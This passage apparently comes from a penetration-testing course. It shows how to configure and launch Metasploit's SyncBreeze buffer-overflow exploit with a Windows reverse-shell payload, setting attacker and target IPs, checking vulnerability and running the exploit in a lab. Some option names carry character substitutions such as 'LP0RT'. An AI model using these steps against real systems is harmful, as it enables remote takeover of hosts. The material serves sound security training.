| RP0RT | 80 | yes | The target port (TCP) | SSl | false | no | Negotiate SSL/TLS for outgoing connections | H0ST |  | no | HTTP server virtual host |

Payload options (windows/shell_reverse_tcp):

| Name | Current Setting | Required | Description |
|---|---|---|---|
| EXITFUNC | thread | yes | Exit technique (Accepted: '', seh, thread, pro |
| LHOST |  | yes | The listen address |
| LP0RT | 4444 | yes | The listen port |

Exploit target:

| Id | Name |
|---|---|
| 0 | Automatic |

Listing 759 - Choosing a payload

The "Exploit target" section below the payload settings lists OS or software versions vulnerable to this exploit. In the case of a vanilla stack overflow like the one found in Syncbreeze, these settings essentially equate to different return addresses that are suitable for different OS versions or environments of the affected software. In this exploit module, a single static return address for our version of SyncBreeze will work for multiple versions of Windows. In other exploits, we will often need to set the target (using set target) to match the environment we are exploiting.

By setting the reverse shell payload for our exploit, Metasploit automatically added some new "Payload options", including LHOST (listen host) and LP0RT (listen port), which correspond to the host IP address and port that the reverse shell will connect to. Note that LP0RT is set to a default value of 4444, which is fine for our purposes. Let's go ahead and set LHOST and RHOST to define our attacking host and target host respectively.

```
msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 exploit(windows/http/syncbreeze_bof) > set RHOST 10.11.0.22
RHOST => 10.11.0.22
```

Listing 760 - Configuring the required parameters

After setting LHOST to our Kali IP address and RHOST to the Windows host IP address, we can use check to verify whether or not the target host and application are vulnerable. Note that this check will only work if the target application exposes some sort of banner or other identifiable data.

```
msf5 exploit(windows/http/syncbreeze_bof) > check
[*] 10.11.0.22:80 - The target appears to be vulnerable.
```

Listing 761 - Checking if the target is vulnerable

With confirmation that the target is vulnerable, all that remains now is to run the exploit using the exploit command as displayed below.

```
msf5 exploit(windows/http/syncbreeze_bof) > exploit
```